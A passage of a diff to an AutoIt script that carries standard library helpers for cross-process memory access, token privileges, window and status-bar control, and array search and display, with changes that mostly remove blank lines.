 	Local $pMemory = _MemVirtualAllocEx($hProcess, 0, $iSize, $iAlloc, 0x00000004) ; $PAGE_READWRITE = 0x00000004
-
 	If $pMemory = 0 Then Return SetError(2, 0, 0) ; Unable to allocate memory
-
 	$tMemMap = DllStructCreate($tagMEMMAP)
 	DllStructSetData($tMemMap, "hProc", $hProcess)
 	DllStructSetData($tMemMap, "Size", $iSize)
 	DllStructSetData($tMemMap, "Mem", $pMemory)
 	Return $pMemory
 EndFunc   ;==>_MemInit
-
 ; #INTERNAL_USE_ONLY# ===========================================================================================================
 ; Name...........: _MemWrite
 ; Description ...: Transfer memory to external address space from internal address space
@@ -2721,7 +2698,6 @@ Func _MemWrite(ByRef $tMemMap, $pSrce, $pDest = 0, $iSize = 0, $sSrce = "ptr")
 	If @error Then Return SetError(@error, @extended, False)
 	Return $aResult[0]
 EndFunc   ;==>_MemWrite
-
 ; #INTERNAL_USE_ONLY# ===========================================================================================================
 ; Name...........: _MemFree
 ; Description ...: Releases a memory map structure for a control
@@ -2744,7 +2720,6 @@ Func _MemFree(ByRef $tMemMap)
 	If @error Then Return SetError(@error, @extended, False)
 	Return $bResult
 EndFunc   ;==>_MemFree
-
 ; #INTERNAL_USE_ONLY# ===========================================================================================================
 ; Name...........: _MemRead
 ; Description ...: Transfer memory from external address space to internal address space
@@ -2768,7 +2743,6 @@ Func _MemRead(ByRef $tMemMap, $pSrce, $pDest, $iSize)
 	If @error Then Return SetError(@error, @extended, False)
 	Return $aResult[0]
 EndFunc   ;==>_MemRead
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _WinAPI_GetMousePosX
 ; Description ...: Returns the current mouse X position
@@ -2789,7 +2763,6 @@ Func _WinAPI_GetMousePosX($fToClient = False, $hwnd = 0)
 	If @error Then Return SetError(@error, @extended, 0)
 	Return DllStructGetData($tPoint, "X")
 EndFunc   ;==>_WinAPI_GetMousePosX
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _WinAPI_GetMousePosY
 ; Description ...: Returns the current mouse Y position
@@ -2810,7 +2783,6 @@ Func _WinAPI_GetMousePosY($fToClient = False, $hwnd = 0)
 	If @error Then Return SetError(@error, @extended, 0)
 	Return DllStructGetData($tPoint, "Y")
 EndFunc   ;==>_WinAPI_GetMousePosY
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _WinAPI_GetMousePos
 ; Description ...: Returns the current mouse position
@@ -2839,7 +2811,6 @@ Func _WinAPI_GetMousePos($fToClient = False, $hwnd = 0)
 	EndIf
 	Return $tPoint
 EndFunc   ;==>_WinAPI_GetMousePos
-
 ; #INTERNAL_USE_ONLY# ===========================================================================================================
 ; Name...........: __UDF_GetNextGlobalID
 ; Description ...: Used for setting controlID to UDF controls
@@ -2856,10 +2827,8 @@ EndFunc   ;==>_WinAPI_GetMousePos
 ; ===============================================================================================================================
 Func __UDF_GetNextGlobalID($hwnd)
 	Local $nCtrlID, $iUsedIndex = -1, $fAllUsed = True
-
 	; check if window still exists
 	If Not WinExists($hwnd) Then Return SetError(-1, -1, 0)
-
 	; check that all slots still hold valid window handles
 	For $iIndex = 0 To 16 - 1 ; $_UDF_GlobalID_MAX_WIN = 16
 		If $_UDF_GlobalIDs_Used[$iIndex][0] <> 0 Then
@@ -2873,7 +2842,6 @@ Func __UDF_GetNextGlobalID($hwnd)
 			EndIf
 		EndIf
 	Next
-
 	; check if window has been used before with this function
 	For $iIndex = 0 To 16 - 1 ; $_UDF_GlobalID_MAX_WIN = 16
 		If $_UDF_GlobalIDs_Used[$iIndex][0] = $hwnd Then
@@ -2881,7 +2849,6 @@ Func __UDF_GetNextGlobalID($hwnd)
 			ExitLoop ; $hWnd has been used before
 		EndIf
 	Next
-
 	; window hasn't been used before, get 1st un-used index
 	If $iUsedIndex = -1 Then
 		For $iIndex = 0 To 16 - 1 ; $_UDF_GlobalID_MAX_WIN = 16
@@ -2894,9 +2861,7 @@ Func __UDF_GetNextGlobalID($hwnd)
 			EndIf
 		Next
 	EndIf
-
 	If $iUsedIndex = -1 And $fAllUsed Then Return SetError(16, 0, 0) ; used up all 16 window slots
-
 	; used all control ids
 	If $_UDF_GlobalIDs_Used[$iUsedIndex][1] = 10000 + 55535 Then ; $_UDF_STARTID = 10000 $_UDF_GlobalID_MAX_IDS = 55535
 		; check if control has been deleted, if so use that index in array
@@ -2909,14 +2874,12 @@ Func __UDF_GetNextGlobalID($hwnd)
 		Next
 		Return SetError(-1, 55535, 0) ; we have used up all available control ids $_UDF_GlobalID_MAX_IDS = 55535
 	EndIf
-
 	; new control id
 	$nCtrlID = $_UDF_GlobalIDs_Used[$iUsedIndex][1]
 	$_UDF_GlobalIDs_Used[$iUsedIndex][1] += 1
 	$_UDF_GlobalIDs_Used[$iUsedIndex][($nCtrlID - 10000) + 2] = $nCtrlID ; $_UDF_GlobalIDs_OFFSET = 2
 	Return $nCtrlID
 EndFunc   ;==>__UDF_GetNextGlobalID
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _WinAPI_CreateWindowEx
 ; Description ...: Creates an overlapped, pop-up, or child window
@@ -2935,7 +2898,7 @@ EndFunc   ;==>__UDF_GetNextGlobalID
 ;                  $pParam      - Pointer to window-creation data
 ; Return values .: Success      - The handle to the new window
 ;                  Failure      - 0
-; Author ........: PAnonymous
+; Author ........: Anonymous
 ; Modified.......: Anonymous
 ; Remarks .......:
 ; Related .......: _WinAPI_DestroyWindow
@@ -2949,7 +2912,6 @@ Func _WinAPI_CreateWindowEx($iExStyle, $sClass, $sName, $iStyle, $iX, $iY, $iWid
 	If @error Then Return SetError(@error, @extended, 0)
 	Return $aResult[0]
 EndFunc   ;==>_WinAPI_CreateWindowEx
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlStatusBar_Resize
 ; Description ...: Causes the status bar to resize itself
@@ -2965,10 +2927,8 @@ EndFunc   ;==>_WinAPI_CreateWindowEx
 ; ===============================================================================================================================
 Func _GUICtrlStatusBar_Resize($hwnd)
 	If $Debug_SB Then __UDF_ValidateClassName($hwnd, "msctls_statusbar32") ; $__STATUSBARCONSTANT_ClassName	= "msctls_statusbar32"
-
 	_SendMessage($hwnd, 0x05) ; $__STATUSBARCONSTANT_WM_SIZE = 0x05
 EndFunc   ;==>_GUICtrlStatusBar_Resize
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlStatusBar_GetUnicodeFormat
 ; Description ...: Retrieves the Unicode character format flag
@@ -2985,10 +2945,8 @@ EndFunc   ;==>_GUICtrlStatusBar_Resize
 ; ===============================================================================================================================
 Func _GUICtrlStatusBar_GetUnicodeFormat($hwnd)
 	If $Debug_SB Then __UDF_ValidateClassName($hwnd, "msctls_statusbar32") ; $__STATUSBARCONSTANT_ClassName	= "msctls_statusbar32"
-
 	Return _SendMessage($hwnd, 0x2000 + 6) <> 0 ; $SB_GETUNICODEFORMAT = 0x2000 + 6
 EndFunc   ;==>_GUICtrlStatusBar_GetUnicodeFormat
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _GUICtrlStatusBar_IsSimple
 ; Description ...: Checks a status bar control to determine if it is in simple mode
@@ -3005,10 +2963,8 @@ EndFunc   ;==>_GUICtrlStatusBar_GetUnicodeFormat
 ; ===============================================================================================================================
 Func _GUICtrlStatusBar_IsSimple($hwnd)
 	If $Debug_SB Then __UDF_ValidateClassName($hwnd, "msctls_statusbar32") ; $__STATUSBARCONSTANT_ClassName	= "msctls_statusbar32"
-
 	Return _SendMessage($hwnd, 0x400 + 14) <> 0 ; $SB_ISSIMPLE = ($__STATUSBARCONSTANT_WM_USER + 14)
 EndFunc   ;==>_GUICtrlStatusBar_IsSimple
-
 ; #INTERNAL_USE_ONLY# ===========================================================================================================
 ; Name...........: __UDF_DebugPrint; Description ...: Used for debugging when creating examples
 ; Syntax.........: __UDF_DebugPrint($hWnd[, $iLine = @ScriptLineNumber])
@@ -3030,7 +2986,6 @@ Func __UDF_DebugPrint($sText, $iLine = @ScriptLineNumber, $ERR = @error, $ext = 
 			"+======================================================" & @CRLF)
 	Return SetError($ERR, $ext, 1)
 EndFunc   ;==>__UDF_DebugPrint
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _WinAPI_IsClassName
 ; Description ...: Wrapper to check ClassName of the control.
@@ -3057,7 +3012,6 @@ Func _WinAPI_IsClassName($hwnd, $sClassName)
 	Next
 	Return False
 EndFunc   ;==>_WinAPI_IsClassName
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _WinAPI_GetClassName
 ; Description ...: Retrieves the name of the class to which the specified window belongs
@@ -3077,7 +3031,6 @@ Func _WinAPI_GetClassName($hwnd)
 	If @error Then Return SetError(@error, @extended, False)
 	Return SetExtended($aResult[0], $aResult[2])
 EndFunc   ;==>_WinAPI_GetClassName
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _WinAPI_GetWindowThreadProcessId
 ; Description ...: Retrieves the identifier of the thread that created the specified window
@@ -3098,7 +3051,6 @@ Func _WinAPI_GetWindowThreadProcessId($hwnd, ByRef $iPID)
 	$iPID = $aResult[2]
 	Return $aResult[0]
 EndFunc   ;==>_WinAPI_GetWindowThreadProcessId
-
 ; #INTERNAL_USE_ONLY# ===========================================================================================================
 ; Name...........: __Mem_OpenProcess
 ; Description ...: Returns a handle of an existing process object
@@ -3123,7 +3075,6 @@ Func __Mem_OpenProcess($iAccess, $fInherit, $iProcessID, $fDebugPriv = False)
 	If @error Then Return SetError(@error, @extended, 0)
 	If $aResult[0] Then Return $aResult[0]
 	If Not $fDebugPriv Then Return 0
-
 	; Enable debug privileged mode
 	Local $hToken = _Security__OpenThreadTokenEx(BitOR(0x00000020, 0x00000008)) ; $TOKEN_ADJUST_PRIVILEGES = 0x00000020 $TOKEN_QUERY = 0x00000008
 	If @error Then Return SetError(@error, @extended, 0)
@@ -3137,7 +3088,6 @@ Func __Mem_OpenProcess($iAccess, $fInherit, $iProcessID, $fDebugPriv = False)
 		$iError = @error
 		$iLastError = @extended
 		If $aResult[0] Then $iRet = $aResult[0]
-
 		; Disable debug privileged mode
 		_Security__SetPrivilege($hToken, "SeDebugPrivilege", False)
 		If @error Then
@@ -3147,10 +3097,8 @@ Func __Mem_OpenProcess($iAccess, $fInherit, $iProcessID, $fDebugPriv = False)
 	EndIf
 	DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hToken)
 	; No need to test @error.
-
 	Return SetError($iError, $iLastError, $iRet)
 EndFunc   ;==>__Mem_OpenProcess
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _MemVirtualAllocEx
 ; Description ...: Reserves a region of memory within the virtual address space of a specified process
@@ -3186,7 +3134,6 @@ Func _MemVirtualAllocEx($hProcess, $pAddress, $iSize, $iAllocation, $iProtect)
 	If @error Then Return SetError(@error, @extended, 0)
 	Return $aResult[0]
 EndFunc   ;==>_MemVirtualAllocEx
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _MemVirtualFreeEx
 ; Description ...: Releases a region of pages within the virtual address space of a process
@@ -3211,7 +3158,6 @@ Func _MemVirtualFreeEx($hProcess, $pAddress, $iSize, $iFreeType)
 	If @error Then Return SetError(@error, @extended, False)
 	Return $aResult[0]
 EndFunc   ;==>_MemVirtualFreeEx
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _WinAPI_ScreenToClient
 ; Description ...: Converts screen coordinates of a specified point on the screen to client coordinates
@@ -3234,7 +3180,6 @@ Func _WinAPI_ScreenToClient($hwnd, ByRef $tPoint)
 	If @error Then Return SetError(@error, @extended, False)
 	Return $aResult[0]
 EndFunc   ;==>_WinAPI_ScreenToClient
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _WinAPI_GetModuleHandle
 ; Description ...: Returns a module handle for the specified module
@@ -3263,7 +3208,6 @@ Func _WinAPI_GetModuleHandle($sModuleName)
 	If @error Then Return SetError(@error, @extended, 0)
 	Return $aResult[0]
 EndFunc   ;==>_WinAPI_GetModuleHandle
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _Security__OpenThreadTokenEx
 ; Description ...: Opens the access token associated with a thread, impersonating the client's security context if required
@@ -3296,7 +3240,6 @@ Func _Security__OpenThreadTokenEx($iAccess, $hThread = 0, $fOpenAsSelf = False)
 	EndIf
 	Return $hToken
 EndFunc   ;==>_Security__OpenThreadTokenEx
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _Security__SetPrivilege
 ; Description ...: Enables or disables a local token privilege
@@ -3318,7 +3261,6 @@ EndFunc   ;==>_Security__OpenThreadTokenEx
 Func _Security__SetPrivilege($hToken, $sPrivilege, $fEnable)
 	Local $iLUID = _Security__LookupPrivilegeValue("", $sPrivilege)
 	If $iLUID = 0 Then Return SetError(-1, 0, False)
-
 	Local $tCurrState = DllStructCreate($tagTOKEN_PRIVILEGES)
 	Local $pCurrState = DllStructGetPtr($tCurrState)
 	Local $iCurrState = DllStructGetSize($tCurrState)
@@ -3375,7 +3317,6 @@ Func _Security__OpenThreadToken($iAccess, $hThread = 0, $fOpenAsSelf = False)
 	If @error Then Return SetError(@error, @extended, 0)
 	Return SetError(0, $aResult[0], $aResult[4]) ; Token
 EndFunc   ;==>_Security__OpenThreadToken
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _Security__ImpersonateSelf
 ; Description ...: Obtains an access token that impersonates the calling process security context
@@ -3402,7 +3343,6 @@ Func _Security__ImpersonateSelf($iLevel = 2)
 	If @error Then Return SetError(@error, @extended, False)
 	Return $aResult[0]
 EndFunc   ;==>_Security__ImpersonateSelf
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _Security__LookupPrivilegeValue
 ; Description ...: Retrieves the locally unique identifier (LUID) for a privilege value
@@ -3424,7 +3364,6 @@ Func _Security__LookupPrivilegeValue($sSystem, $sName)
 	If @error Then Return SetError(@error, @extended, 0)
 	Return SetError(0, $aResult[0], $aResult[3]) ; LUID
 EndFunc   ;==>_Security__LookupPrivilegeValue
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _Security__AdjustTokenPrivileges
 ; Description ...: Enables or disables privileges in the specified access token
@@ -3454,7 +3393,6 @@ Func _Security__AdjustTokenPrivileges($hToken, $fDisableAll, $pNewState, $iBuffe
 	If @error Then Return SetError(@error, @extended, False)
 	Return $aResult[0]
 EndFunc   ;==>_Security__AdjustTokenPrivileges
-
 ; #FUNCTION# ====================================================================================================================
 ; Name...........: _WinAPI_GetLastError
 ; Description ...: Returns the calling thread's lasterror code value
@@ -3472,18 +3410,14 @@ Func _WinAPI_GetLastError($curErr = @error, $curExt = @extended)
 	Local $aResult = DllCall("kernel32.dll", "dword", "GetLastError")
 	Return SetError($curErr, $curExt, $aResult[0])
 EndFunc   ;==>_WinAPI_GetLastError
-
 Func _ArraySearch(Const ByRef $avArray, $vValue, $iStart = 0, $iEnd = 0, $iCase = 0, $iPartial = 0, $iForward = 1, $iSubItem = -1)
 	If Not IsArray($avArray) Then Return SetError(1, 0, -1)
 	If UBound($avArray, 0) > 2 Or UBound($avArray, 0) < 1 Then Return SetError(2, 0, -1)
-
 	Local $iUBound = UBound($avArray) - 1
-
 	; Bounds checking
 	If $iEnd < 1 Or $iEnd > $iUBound Then $iEnd = $iUBound
 	If $iStart < 0 Then $iStart = 0
 	If $iStart > $iEnd Then Return SetError(4, 0, -1)
-
 	; Direction (flip if $iForward = 0)
 	Local $iStep = 1
 	If Not $iForward Then
@@ -3492,7 +3426,6 @@ Func _ArraySearch(Const ByRef $avArray, $vValue, $iStart = 0, $iEnd = 0, $iCase 
 		$iEnd = $iTmp
 		$iStep = -1
 	EndIf
-
 	; Search
 	Switch UBound($avArray, 0)
 		Case 1 ; 1D array search
@@ -3520,7 +3453,6 @@ Func _ArraySearch(Const ByRef $avArray, $vValue, $iStart = 0, $iEnd = 0, $iCase 
 			Else
 				$iUBoundSub = $iSubItem
 			EndIf
-
 			For $j = $iSubItem To $iUBoundSub
 				If Not $iPartial Then
 					If Not $iCase Then
@@ -3541,20 +3473,16 @@ Func _ArraySearch(Const ByRef $avArray, $vValue, $iStart = 0, $iEnd = 0, $iCase 
 		Case Else
 			Return SetError(7, 0, -1)
 	EndSwitch
-
 	Return SetError(6, 0, -1)
 EndFunc   ;==>_ArraySearch
-
 Func _ArrayDisplay(Const ByRef $avArray, $sTitle = "Array: ListView Display", $iItemLimit = -1, $iTranspose = 0, $sSeparator = "", $sReplace = "|", $sHeader = "")
 	If Not IsArray($avArray) Then Return SetError(1, 0, 0)
 	; Dimension checking
 	Local $iDimension = UBound($avArray, 0), $iUBound = UBound($avArray, 1) - 1, $iSubMax = UBound($avArray, 2) - 1
 	If $iDimension > 2 Then Return SetError(2, 0, 0)
-
 	; Separator handling
 ;~     If $sSeparator = "" Then $sSeparator = Chr(1)
 	If $sSeparator = "" Then $sSeparator = Chr(124)
-
 	;  Check the separator to make sure it's not used literally in the array
 	If _ArraySearch($avArray, $sSeparator, 0, 0, 0, 1) <> -1 Then
 		For $x = 1 To 255
@@ -3566,12 +3494,10 @@ Func _ArrayDisplay(Const ByRef $avArray, $sTitle = "Array: ListView Display", $i
 			EndIf
 		Next
 	EndIf
-
 	; Declare variables
 	Local $vTmp, $iBuffer = 64
 	Local $iColLimit = 250
 	Local $iOnEventMode = Opt("GUIOnEventMode", 0), $sDataSeparatorChar = Opt("GUIDataSeparatorChar", $sSeparator)
-
 	; Swap dimensions if transposing
 	If $iSubMax < 0 Then $iSubMax = 0
 	If $iTranspose Then
@@ -3579,12 +3505,10 @@ Func _ArrayDisplay(Const ByRef $avArray, $sTitle = "Array: ListView Display", $i
 		$iUBound = $iSubMax
 		$iSubMax = $vTmp
 	EndIf
-
 	; Set limits for dimensions
 	If $iSubMax > $iColLimit Then $iSubMax = $iColLimit
 	If $iItemLimit < 1 Then $iItemLimit = $iUBound
 	If $iUBound > $iItemLimit Then $iUBound = $iItemLimit
-
 	; Set header up
 	If $sHeader = "" Then
 		$sHeader = "Row  " ; blanks added to adjust column size for big number of rows
@@ -3592,7 +3516,6 @@ Func _ArrayDisplay(Const ByRef $avArray, $sTitle = "Array: ListView Display", $i
 			$sHeader &= $sSeparator & "Col " & $i
 		Next
 	EndIf
-
 	; Convert array into text for listview
 	Local $avArrayText[$iUBound + 1]
 	For $i = 0 To $iUBound
@@ -3612,18 +3535,15 @@ Func _ArrayDisplay(Const ByRef $avArray, $sTitle = "Array: ListView Display", $i
 					$vTmp = $avArray[$i][$j]
 				EndIf
 			EndIf
-
 			; Add to text array
 			$vTmp = StringReplace($vTmp, $sSeparator, $sReplace, 0, 1)
 			$avArrayText[$i] &= $sSeparator & $vTmp
-
 			; Set max buffer size
 			$vTmp = StringLen($vTmp)
 			If $vTmp > $iBuffer Then $iBuffer = $vTmp
 		Next
 	Next
 	$iBuffer += 1
-
 	; GUI Constants
 	Local Const $_ARRAYCONSTANT_GUI_DOCKBORDERS = 0x66
 	Local Const $_ARRAYCONSTANT_GUI_DOCKBOTTOM = 0x40
@@ -3647,14 +3567,12 @@ Func _ArrayDisplay(Const ByRef $avArray, $sTitle = "Array: ListView Display", $i
 	Local Const $_ARRAYCONSTANT_WS_MINIMIZEBOX = 0x00020000
 	Local Const $_ARRAYCONSTANT_WS_SIZEBOX = 0x00040000
 	Local Const $_ARRAYCONSTANT_tagLVITEM = "int Mask;int Item;int SubItem;int State;int StateMask;ptr Text;int TextMax;int Image;int Param;int Indent;int GroupID;int Columns;ptr pColumns"
-
 	Local $iAddMask = BitOR($_ARRAYCONSTANT_LVIF_TEXT, $_ARRAYCONSTANT_LVIF_PARAM)
 	Local $tBuffer = DllStructCreate("wchar Text[" & $iBuffer & "]"), $pBuffer = DllStructGetPtr($tBuffer)
 	Local $tItem = DllStructCreate($_ARRAYCONSTANT_tagLVITEM), $pItem = DllStructGetPtr($tItem)
 	DllStructSetData($tItem, "Param", 0)
 	DllStructSetData($tItem, "Text", $pBuffer)
 	DllStructSetData($tItem, "TextMax", $iBuffer)
-
 	; Set interface up
 	Local $iWidth = 640, $iHeight = 480
 	Local $hGUI = GUICreate($sTitle, $iWidth, $iHeight, Default, Default, BitOR($_ARRAYCONSTANT_WS_SIZEBOX, $_ARRAYCONSTANT_WS_MINIMIZEBOX, $_ARRAYCONSTANT_WS_MAXIMIZEBOX))
@@ -3666,7 +3584,6 @@ Func _ArrayDisplay(Const ByRef $avArray, $sTitle = "Array: ListView Display", $i
 	GUICtrlSendMsg($hListView, $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE, $_ARRAYCONSTANT_LVS_EX_GRIDLINES, $_ARRAYCONSTANT_LVS_EX_GRIDLINES)
 	GUICtrlSendMsg($hListView, $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE, $_ARRAYCONSTANT_LVS_EX_FULLROWSELECT, $_ARRAYCONSTANT_LVS_EX_FULLROWSELECT)
 	GUICtrlSendMsg($hListView, $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE, $_ARRAYCONSTANT_WS_EX_CLIENTEDGE, $_ARRAYCONSTANT_WS_EX_CLIENTEDGE)
-
 	; Fill listview
 	Local $aItem
 	For $i = 0 To $iUBound
@@ -3674,13 +3591,11 @@ Func _ArrayDisplay(Const ByRef $avArray, $sTitle = "Array: ListView Display", $i
 			; use GUICtrlSendMsg() to overcome AutoIt limitation
 			$aItem = StringSplit($avArrayText[$i], $sSeparator)
 			DllStructSetData($tBuffer, "Text", $aItem[1])
-
 			; Add listview item
 			DllStructSetData($tItem, "Item", $i)
 			DllStructSetData($tItem, "SubItem", 0)
 			DllStructSetData($tItem, "Mask", $iAddMask)
 			GUICtrlSendMsg($hListView, $_ARRAYCONSTANT_LVM_INSERTITEMW, 0, $pItem)
-
 			; Set listview subitem text
 			DllStructSetData($tItem, "Mask", $_ARRAYCONSTANT_LVIF_TEXT)
 			For $j = 2 To $aItem[0]
@@ -3690,7 +3605,6 @@ Func _ArrayDisplay(Const ByRef $avArray, $sTitle = "Array: ListView Display", $i
 			Next
 		EndIf
 	Next
-
 	; adjust window width
 	$iWidth = 0
 	For $i = 0 To $iSubMax + 1
@@ -3698,22 +3612,16 @@ Func _ArrayDisplay(Const ByRef $avArray, $sTitle = "Array: ListView Display", $i
 	Next
 	If $iWidth < 250 Then $iWidth = 230
 	$iWidth += 20
-
 	If $iWidth > @DesktopWidth Then $iWidth = @DesktopWidth - 100
-
 	WinMove($hGUI, "", (@DesktopWidth - $iWidth) / 2, Default, $iWidth)
-
 	; Show dialog
 	GUISetState(@SW_SHOW, $hGUI)
-
 	While 1
 		Switch GUIGetMsg()
 			Case $_ARRAYCONSTANT_GUI_EVENT_CLOSE
 				ExitLoop
-
 			Case $hCopy
 				Local $sClip = ""
-
 				; Get selected indices [ _GUICtrlListView_GetSelectedIndices($hListView, True) ]
 				Local $aiCurItems[1] = [0]
 				For $i = 0 To GUICtrlSendMsg($hListView, $_ARRAYCONSTANT_LVM_GETITEMCOUNT, 0, 0)
@@ -3723,7 +3631,6 @@ Func _ArrayDisplay(Const ByRef $avArray, $sTitle = "Array: ListView Display", $i
 						$aiCurItems[$aiCurItems[0]] = $i
 					EndIf
 				Next
-
 				; Generate clipboard text
 				If Not $aiCurItems[0] Then
 					For $sItem In $avArrayText
@@ -3738,9 +3645,7 @@ Func _ArrayDisplay(Const ByRef $avArray, $sTitle = "Array: ListView Display", $i
 		EndSwitch
 	WEnd
 	GUIDelete($hGUI)
-
 	Opt("GUIOnEventMode", $iOnEventMode)
 	Opt("GUIDataSeparatorChar", $sDataSeparatorChar)
-
 	Return 1
 EndFunc   ;==>_ArrayDisplay
